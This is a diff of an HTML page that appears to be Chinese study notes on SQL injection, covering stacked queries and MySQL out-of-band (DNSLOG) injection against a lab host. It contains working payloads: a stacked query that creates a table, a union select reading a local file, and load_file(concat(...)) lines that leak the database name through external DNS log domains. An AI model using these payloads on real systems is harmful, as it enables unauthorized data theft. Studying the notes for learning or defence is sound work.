@@ -888,8 +888,14 @@
 <p>所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数，根据数据库类型决定是否支持多条语句执行.<br><br><br>例如：<br>10.0.1.139:80&#x2F;sqli&#x2F;test.php?id&#x3D;1;create table cypher(personalid int);<br><br></p>
 <p><a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p>
 <p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql等</p>
-<h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><p>0.注入条件<br>ROOT高权限且支持load_file()，需要同时满足两个要求，条件太苛刻了<br>有部分注入点是没有回显的，所有读取也是没回显的，所以采用带外</p>
-<p>1.使用平台<br><a href="https://dig.pm/">https://dig.pm/</a><br>2.带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：</p>
+<h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><ol start="0">
+<li><p>注入条件<br>ROOT高权限且支持load_file()，需要同时满足两个要求，条件太苛刻了<br>有部分注入点是没有回显的，所有读取也是没回显的，所以采用带外</p>
+</li>
+<li><p>使用平台<br><a href="https://dig.pm/">https://dig.pm/</a></p>
+</li>
+<li><p>带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：</p>
+</li>
+</ol>
 <p>select load_file(concat(‘\\‘,(select database()),’.7logee.dnslog.cn\aa’));</p>
 <p>union select 1,2,3,load_file(“d:\1.txt”),5,6</p>
 <p>查询当前数据库<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.d7a64120ce.ipv6.1433.eu.org&#x2F;abc’)))</p>
